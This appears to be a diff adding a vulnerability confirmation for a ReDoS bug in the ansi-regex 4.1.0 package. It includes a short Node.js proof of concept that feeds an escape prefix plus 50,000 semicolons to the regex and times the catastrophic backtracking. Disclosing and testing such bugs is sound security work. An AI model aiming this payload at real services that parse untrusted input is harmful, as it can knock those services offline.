@@ -1,0 +1,17 @@
+Confirmed: `ansi-regex@4.1.0` has a ReDoS via nested quantifiers `(?:\d{1,4}(?:;\d{0,4})*)?`; a string of many semicolons causes catastrophic backtracking (~7.5s for 50k chars, growing exponentially).
+
+```javascript
+const ansiRegex = require("./node_modules/ansi-regex");
+
+const re = ansiRegex();
+
+// Malicious input: CSI-like prefix followed by a long run of semicolons
+// and no valid terminator, forcing catastrophic backtracking in the
+// nested (?:\d{1,4}(?:;\d{0,4})*)? quantifier.
+const payload = "\x1b[" + ";".repeat(50000);
+
+console.log("Starting match, this should be near-instant for a linear-time regex...");
+console.time("match");
+payload.match(re);
+console.timeEnd("match");
+```
